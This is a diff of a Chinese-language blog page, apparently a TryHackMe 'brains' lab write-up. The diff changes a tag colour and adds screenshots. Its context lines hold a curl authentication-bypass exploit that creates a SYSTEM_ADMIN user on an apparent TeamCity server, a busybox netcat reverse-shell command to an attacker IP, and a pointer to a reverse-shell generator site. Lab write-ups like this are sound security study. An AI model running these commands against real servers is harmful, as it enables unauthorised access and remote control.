@@ -175,7 +175,7 @@
             
             <span class="tag">
                 
-                <a href="/tags/THM/" style="color: #ffa2c4">
+                <a href="/tags/THM/" style="color: #ff7d73">
                     THM
                 </a>
             </span>
@@ -224,8 +224,11 @@ C:\Users\sfewer&gt;curl -ik http://172.29.228.65:8111/hax?jsp=/app/rest/server;.
 <p>然后调整有效载荷并且添加我们的用户 jujube</p>
 <pre><code class="language-cmd">curl -ik http://10.10.205.41:50000/hax?jsp=/app/rest/users\;.jsp -X POST -H &quot;Content-Type: application/json&quot; --data &quot;&#123;\&quot;username\&quot;: \&quot;jujube\&quot;, \&quot;password\&quot;: \&quot;jujube\&quot;, \&quot;email\&quot;: \&quot;0xb0b\&quot;, \&quot;roles\&quot;: &#123;\&quot;role\&quot;: [&#123;\&quot;roleId\&quot;: \&quot;SYSTEM_ADMIN\&quot;, \&quot;scope\&quot;: \&quot;g\&quot;&#125;]&#125;&#125;&quot;
 </code></pre>
+<p><img src="/pic/brains/5.png" alt="5"></p>
 <p>然后进行登录。成功了。</p>
+<p><img src="/pic/brains/6.png" alt="6"></p>
 <p>接下来就执行找py打shell了。</p>
+<p><img src="/pic/brains/7.png" alt="7"></p>
 <p>然后反弹shell，以获取交互式shell</p>
 <p>这里推荐一个网站：<a target="_blank" rel="noopener" href="https://www.revshells.com/">https://www.revshells.com/</a></p>
 <pre><code class="language-cmd">busybox nc 10.17.33.100 8888 -e sh
